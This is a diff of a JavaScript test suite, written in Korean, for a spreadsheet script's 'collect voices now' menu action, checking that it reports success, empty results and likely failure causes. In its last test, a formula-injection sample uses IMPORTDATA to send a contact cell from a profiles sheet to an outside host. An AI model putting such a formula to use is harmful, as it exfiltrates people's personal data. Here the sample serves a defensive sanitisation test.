@@ -231,6 +231,84 @@ test('녹음 파일이 없는 응답은 적재하지 않는다 — 빈 껍데기
   assert.equal(r.voice.length, 0, '파일 없는 제출이 voice_log 에 앉았다');
 });
 
+// ── 실행 통로(메뉴 버튼) — 「돌았나」를 눈으로 재는 자리 ───────────────────
+/* 위 검사들이 「돌리면 값이 옳게 앉는다」를 닫았다면, 여기는 그 앞칸이다 —
+ * **유호님이 누를 자리가 있고, 눌렀을 때 «무슨 일이 났는지» 말해 주는가.**
+ * 🔑 이 통로에서 0건은 성공의 얼굴을 하고 있다(폼 미연결·새 제출 없음·동의 미확인이 전부
+ *    조용히 0을 낸다). 그래서 과녁은 「0이냐」가 아니라 **「0인 «까닭»을 말하느냐」**다. */
+
+const 셋업 = fs.readFileSync(path.join(ROOT, '엔진_셋업확장.js'), 'utf8');
+
+/** `voiceSweepNow_` 를 태운다 — `voiceSweep_` 는 «가짜»다(여기 과녁은 걷기가 아니라 «보고»다). */
+function 지금걷기(opt) {
+  const o = opt || {};
+  const 시트 = {};
+  if (o.폼없음 !== true) {
+    시트.목소리폼_응답 = 시트흉내({ 첫행: 1, 행들: [폼머리.slice()].concat(new Array(o.제출 === undefined ? 1 : o.제출).fill(0).map(() => 한줄())) });
+  }
+  const vl = 시트흉내({ 첫행: 1, 행들: [VOICE_LOG_HEADERS.slice()].concat((o.기존voice || []).map(() => VOICE_LOG_HEADERS.map(() => 'x'))) });
+  시트.voice_log = vl;
+
+  const ss = { getSheetByName: (n) => 시트[n] || null, getSpreadsheetTimeZone: () => 'Asia/Seoul' };
+  let 스위프호출 = 0;
+  return {
+    글: 꺼내기(교재, 'function voiceSweepNow_(', 'voiceSweepNow_', {
+      SpreadsheetApp: { getActiveSpreadsheet: () => ss },
+      SYNK_VERSION: 'vTEST',
+      PropertiesService: {
+        getScriptProperties: () => ({ getProperty: () => (o.포인터 === undefined ? null : String(o.포인터)) })
+      },
+      /* 가짜 스위프 — 「몇 건 앉히는가」를 시험이 쥔다. 그래야 각 갈래를 다 볼 수 있다. */
+      voiceSweep_: () => {
+        스위프호출 += 1;
+        for (let i = 0; i < (o.앉힘 || 0); i++) vl.data.push(VOICE_LOG_HEADERS.map(() => 'y'));
+      },
+      isRehearsal_: () => o.리허설 === true
+    })(),
+    get 스위프호출() { return 스위프호출; }
+  };
+}
+
+test('폼 탭이 없으면 스위프를 «안 부르고» 무엇을 하실지 알려준다', () => {
+  const r = 지금걷기({ 폼없음: true });
+  assert.equal(r.스위프호출, 0, '탭이 없는데 스위프를 불렀다 — 엉뚱한 예외가 사용자에게 뜬다');
+  assert.ok(r.글.includes('목소리폼_응답'), '어느 탭이 없는지 안 말한다');
+  assert.ok(/스프레드시트|연결/.test(r.글), '무엇을 하시면 되는지 안 알려준다 — 「없다」만 말하는 화면은 막다른 길이다');
+});
+
+test('앉으면 «몇 건»인지 말한다 — 「오류 없음」과 「걷었음」은 다른 말이다', () => {
+  const r = 지금걷기({ 제출: 3, 포인터: 1, 앉힘: 2 });
+  assert.equal(r.스위프호출, 1);
+  assert.ok(r.글.includes('+2'), `늘어난 수를 안 말한다 — 화면: ${r.글.slice(0, 120)}`);
+  assert.ok(r.글.includes('✅'), '성공을 성공이라고 안 말한다');
+});
+
+test('새 제출이 0이면 «없다»고 말한다 — 실패로 읽히면 안 된다', () => {
+  const r = 지금걷기({ 제출: 2, 포인터: 3, 앉힘: 0 });
+  assert.ok(r.글.includes('새 제출이 없습니다'), '새 제출 0을 결함처럼 보이게 두면 안 된다');
+  assert.ok(!r.글.includes('⚠'), '정상 상태에 경고를 띄운다 — 늑대소년이 된다');
+});
+
+test('🔴 새 제출이 있는데 0건 앉으면 «원인 셋»을 지목한다 — 0이 성공 얼굴을 하는 자리', () => {
+  const r = 지금걷기({ 제출: 2, 포인터: 1, 앉힘: 0 });
+  assert.ok(r.글.includes('⚠'), '새 제출을 봤는데 하나도 안 앉은 것을 조용히 넘긴다');
+  ['음성 동의', 'profiles', '녹음 파일'].forEach((원인) =>
+    assert.ok(r.글.includes(원인), `원인 후보 「${원인}」 를 안 짚는다 — 유호님이 어디를 볼지 모른다`));
+});
+
+test('리허설 중이면 «메일이 안 나갔다»고 밝힌다 — 안 밝히면 안 온 메일을 기다리신다', () => {
+  const r = 지금걷기({ 제출: 2, 포인터: 1, 앉힘: 0, 리허설: true });
+  assert.ok(r.글.includes('리허설'), '리허설 상태를 안 알린다');
+});
+
+test('🔴 메뉴에 등재돼 있고 그 이름의 함수가 실재한다 — 죽은 이름이면 클릭이 그냥 죽는다', () => {
+  const m = 셋업.match(/addItem\('[^']*목소리 지금 걷어오기[^']*',\s*'([A-Za-z_]+)'\)/);
+  assert.ok(m, '메뉴에 「목소리 지금 걷어오기」 항목이 없다 — 유호님이 누를 자리가 없다');
+  assert.ok(셋업.includes('function ' + m[1] + '('), `메뉴가 부르는 ${m[1]} 이 없다 — 누르면 실패한다`);
+  assert.ok(셋업.includes(m[1] + '() { menuRun_('), `${m[1]} 이 menuRun_ 를 안 쓴다 — 결과가 화면에 안 뜬다`);
+  assert.ok(교재.includes('function voiceSweepNow_('), '메뉴가 부르는 본체가 교재연동.js 에 없다');
+});
+
 test('🛡 미션 칸의 수식이 소독된다 — 같은 스프레드시트에 profiles(연락처)가 산다', () => {
   const r = 스윕({ 폼행들: [한줄({ mission: '=IMPORTDATA("http://x?d="&profiles!H2)' })] });
   assert.equal(r.voice.length, 1);
